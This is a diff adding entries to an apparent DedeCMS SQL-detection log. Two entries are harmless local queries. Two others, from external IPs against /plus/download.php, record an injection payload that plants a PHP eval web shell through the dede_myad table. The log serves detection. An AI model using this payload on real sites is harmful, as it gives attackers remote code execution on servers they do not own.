@@ -1,0 +1,4 @@
+127.0.0.1||/||SELECT * FROM #@_arctype  WHERE top=1   ORDER BY mid desc  LIMIT 0,4||comment detect
+127.0.0.1||/||SELECT * FROM #@_arctype  WHERE top=1   LIMIT 0,8||comment detect
+49.79.221.68||/plus/download.php?|| INSERT INTO `dede_myad` SET `normbody` = '{dede:php}file_put_contents(''k'',''<?php eval($_POST[k]);?>'');{/dede:php}'');{/dede:php}' WHERE `aid` =1#downloads`(`hash`,`id`,`downloads`) VALUES('d41d8cd98f00b204e9800998ecf8427e','0',1); ||comment detect
+58.221.186.90||/plus/download.php?|| INSERT INTO `dede_myad` SET `normbody` = '{dede:php}file_put_contents(''k'',''<?php eval($_POST[k]);?>'');{/dede:php}'');{/dede:php}' WHERE `aid` =1#downloads`(`hash`,`id`,`downloads`) VALUES('d41d8cd98f00b204e9800998ecf8427e','0',1); ||comment detect
